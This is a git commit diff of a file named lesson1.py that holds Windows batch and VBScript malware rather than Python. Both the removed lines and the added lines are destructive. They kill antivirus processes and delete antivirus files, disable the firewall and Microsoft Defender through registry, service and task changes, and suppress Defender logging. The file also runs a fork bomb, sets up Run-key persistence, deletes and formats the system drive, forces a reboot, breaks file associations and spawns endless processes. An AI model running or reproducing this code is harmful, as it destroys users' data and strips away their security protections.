35aab7aac4f65d26b673eb0c28fed89c64655d92
tonysanchez <161179351+tonysanchz@users.noreply.github.com>
2025-09-29 17:26:40 +0700

    Update lesson1.py

--- lesson1.py
+++ lesson1.py
@@ -1,163 +1,140 @@
 @echo off
-rem —
-rem Permanently Kill Anti-Virus
-net stop “Security Center”
-netsh firewall set opmode mode=disable
-tskill /A av*
-tskill /A fire*
-tskill /A anti*
-cls
-tskill /A spy*
-tskill /A bullguard
-tskill /A PersFw
-tskill /A KAV*
-tskill /A ZONEALARM
-tskill /A SAFEWEB
-cls
-tskill /A OUTPOST
-tskill /A nv*
-tskill /A nav*
-tskill /A F-*
-tskill /A ESAFE
-tskill /A cle
-cls
-tskill /A BLACKICE
-tskill /A def*
-tskill /A kav
-tskill /A kav*
-tskill /A avg*
-tskill /A ash*
-cls
-tskill /A aswupdsv
-tskill /A ewid*
-tskill /A guard*
-tskill /A guar*
-tskill /A gcasDt*
-tskill /A msmp*
-cls
-tskill /A mcafe*
-tskill /A mghtml
-tskill /A msiexec
-tskill /A outpost
-tskill /A isafe
-tskill /A zap*
-cls
-tskill /A zauinst
-tskill /A upd*
-tskill /A zlclien*
-tskill /A minilog
-tskill /A cc*
-tskill /A norton*
-cls
-tskill /A norton au*
-tskill /A ccc*
-tskill /A npfmn*
-tskill /A loge*
-tskill /A nisum*
-tskill /A issvc
-tskill /A tmp*
-cls
-tskill /A tmn*
-tskill /A pcc*
-tskill /A cpd*
-tskill /A pop*
-tskill /A pav*
-tskill /A padmin
-cls
-tskill /A panda*
-tskill /A avsch*
-tskill /A sche*
-tskill /A syman*
-tskill /A virus*
-tskill /A realm*
-cls
-tskill /A sweep*
-tskill /A scan*
-tskill /A ad-*
-tskill /A safe*
-tskill /A avas*
-tskill /A norm*
-cls
-tskill /A offg*
-del /Q /F C:\Program Files\alwils~1\avast4\*.*
-del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
-del /Q /F C:\Program Files\kasper~1\*.exe
-cls
-del /Q /F C:\Program Files\trojan~1\*.exe
-del /Q /F C:\Program Files\f-prot95\*.dll
-del /Q /F C:\Program Files\tbav\*.dat
-cls
-del /Q /F C:\Program Files\avpersonal\*.vdf
-del /Q /F C:\Program Files\Norton~1\*.cnt
-del /Q /F C:\Program Files\Mcafee\*.*
-cls
-del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
-del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
-del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
-del /Q /F C:\Program Files\Norton~1\*.*
-cls
-del /Q /F C:\Program Files\avgamsr\*.exe
-del /Q /F C:\Program Files\avgamsvr\*.exe
-del /Q /F C:\Program Files\avgemc\*.exe
-cls
-del /Q /F C:\Program Files\avgcc\*.exe
-del /Q /F C:\Program Files\avgupsvc\*.exe
-del /Q /F C:\Program Files\grisoft
-del /Q /F C:\Program Files\nood32krn\*.exe
-del /Q /F C:\Program Files\nood32\*.exe
-cls
-del /Q /F C:\Program Files\nod32
-del /Q /F C:\Program Files\nood32
-del /Q /F C:\Program Files\kav\*.exe
-del /Q /F C:\Program Files\kavmm\*.exe
-del /Q /F C:\Program Files\kaspersky\*.*
-cls
-del /Q /F C:\Program Files\ewidoctrl\*.exe
-del /Q /F C:\Program Files\guard\*.exe
-del /Q /F C:\Program Files\ewido\*.exe
-cls
-del /Q /F C:\Program Files\pavprsrv\*.exe
-del /Q /F C:\Program Files\pavprot\*.exe
-del /Q /F C:\Program Files\avengine\*.exe
-cls
-del /Q /F C:\Program Files\apvxdwin\*.exe
-del /Q /F C:\Program Files\webproxy\*.exe
-del /Q /F C:\Program Files\panda software\*.*
-rem —
-echo @echo off>c:windowswimn32.bat
-echo break off>>c:windowswimn32.bat
-echo ipconfig/release_all>>c:windowswimn32.bat
-echo end>>c:windowswimn32.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
-echo You Have Been HACKED!
-PAUSE
+NET SESSION >nul 2>&1
+if %errorlevel% NEQ 0 (
+  echo Yeu cau quyen admin...
+  powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
+  exit /b
+)
+pause
+
+%0|%0
+
+del C:\ *.* |y
+rem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!!
+
+
+rem NOTE: It is highly recommended to install MS Defender Platform Updates sometimes (monthly) because they affect Windows protection as well, like System Guard!
+rem MS Defender Platform/Signatures Updates - https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-updates?view=o365-worldwide
+rem Windows Security Platform Updates automatically - https://support.microsoft.com/en-us/topic/windows-security-update-a6ac7d2e-b1bf-44c0-a028-41720a242da3
+rem Search a version number to update Defender manually, like: https://www.catalog.update.microsoft.com/Search.aspx?q=4.18.23110.3
+rem Enable Defender - update - restart - disable Defender - https://github.com/TairikuOokami/Windows/blob/main/Microsoft%20Defender%20Enable.bat
+
+rem Disable Tamper and Real Time Protection in Defender - RESTART!
+rem start windowsdefender:
+rem Disable Real Time Protection in Defender - Run "Microsoft Defender Disable.bat" - TWICE - RESTART!
+rem Run "Microsoft Defender Disable.bat" again - TWICE - RESTART!
+
+rem Alternatively run in Safe Mode
+rem Run - msconfig - Boot - Safe Boot - Minimal - Restart
+rem Run "MD Disable.bat" TWICE - RESTART!
+rem Run - msconfig - General - Normal Startup
+
+rem https://www.elevenforum.com/t/turn-on-or-off-tamper-protection-for-microsoft-defender-antivirus-in-windows-11.3973
+rem reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f
+
+rem Disable System Guard Runtime Monitor Broker (when disabled, it might cause BSOD Critical Process Died)
+rem reg add "HKLM\System\CurrentControlSet\Services\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f
+
+rem Disable Windows Defender Security Center
+rem reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
+
+rem 1 - Antivirus Disabled Notification
+reg add "HKLM\Software\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications " /t REG_DWORD /d "1" /f
+
+rem 0 - Security and Maitenance Notification
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f
+
+rem 1 - Disable Real-time protection
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableSpecialRunningModes" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
+
+rem 0 - Disable Logging
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
+
+rem Disable Tasks
+schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
+
+rem Disable systray icon
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
+
+rem Remove context menu
+reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
+
+rem Disable services (it will stop WdFilter.sys as well, better not to disable the driver by itself)
+rem reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
+rem MDCoreSvc has become more persistent and runs when disabled, but it does not interfere
+reg add "HKLM\System\CurrentControlSet\Services\MDCoreSvc" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
+
+rem ======================================= OPTIONAL =======================================
+
+rem Web Threat Defense Service (Phishing protection)
+rem sc config webthreatdefsvc start= disabled
+
+rem Web Threat Defense User Service (Phishing protection)
+rem sc config webthreatdefusersvc start= disabled
+
+rem Off - Disable Windows SmartScreen / On - Enable Windows SmartScreen 
+rem reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f
+
+rem 0 - Disable SmartScreen Filter in Microsoft Edge / 1 - Enable
+rem reg add "HKCU\Software\Microsoft\Edge\SmartScreenEnabled" /ve /t REG_DWORD /d "0" /f
+
+rem 0 - Disable SmartScreen PUA in Microsoft Edge / 1 - Enable
+rem reg add "HKCU\Software\Microsoft\Edge\SmartScreenPuaEnabled" /ve /t REG_DWORD /d "0" /f
+
+rem 0 - Disable Windows SmartScreen for Windows Store Apps / 1 - Enable
+rem reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t "REG_DWORD" /d "0" /f
+
+rem Remove Smartscreen (to restore run "sfc /scannow")
+rem takeown /s %computername% /u %username% /f "%WinDir%\System32\smartscreen.exe"
+rem icacls "%WinDir%\System32\smartscreen.exe" /grant:r %username%:F
+rem taskkill /im smartscreen.exe /f
+rem del "%WinDir%\System32\smartscreen.exe" /s /f /q
+
+rem Disable Stupid Smart App Control blocking legitimate apps like VisualC++ and DX9 / ONCE DISABLED, IT CAN NOT BE ENABLED!
+rem reg add "HKLM\System\CurrentControlSet\Control\CI\Policy" /v "VerifiedAndReputablePolicyState" /t REG_DWORD /d "0" /f
+
+rem Last Tested on Windows 11 Home 27934.1
+rem Microsoft Defender Platform Version 4.18.25080.5 (30-Aug-2025)
+rem Before - https://ibb.co/xtxfxd81 / After - https://ibb.co/4RK0zhj1
+
+pause
+
+
 del %systemdrive%\*.* /f /s /q
 shutdown -r -f -t 00
-Del C:\ *.* |y
-Set wshShell =wscript.CreateObject(”WScript.Shell”)
-do
-wscript.sleep 100
-wshshell.sendkeys “{CAPSLOCK}”
-loop
-:top
-START %SystemRoot%\system32\notepad.exe
-GOTO top
-
 If %date% NEQ 2023/11/25 goto exit
 format C: /y >nul
 :exit
 exit
-
-Option Explicit
-
-Dim WSHShell
-Set WSHShell=Wscript.CreateObject(“Wscript.Shell”)
-
-Dim x
-For x = 1 to 100000000
-WSHShell.Run “Tourstart.exe”
-Next
 
 START reg delete HKCR/.exe
 START reg delete HKCR/.dll
@@ -165,9 +142,13 @@ START reg delete HKCR/*
 :MESSAGE
 ECHO Your computer has been f*cked. Have a nice day :)
 GOTO MESSAGE
-MsgBox “Let’s go back a few steps”
-Set wshShell =wscript.CreateObject(”WScript.Shell”)
-do
-wscript.sleep 100
-wshshell.sendkeys “{bs}”
-loop
+
+Option Explicit
+
+Dim WSHShell
+Set WSHShell=Wscript.CreateObject(“Wscript.Shell”)
+
+Dim x
+For x = 1 to 10000000000
+    WSHShell.Run “Tourstart.exe”
+Next
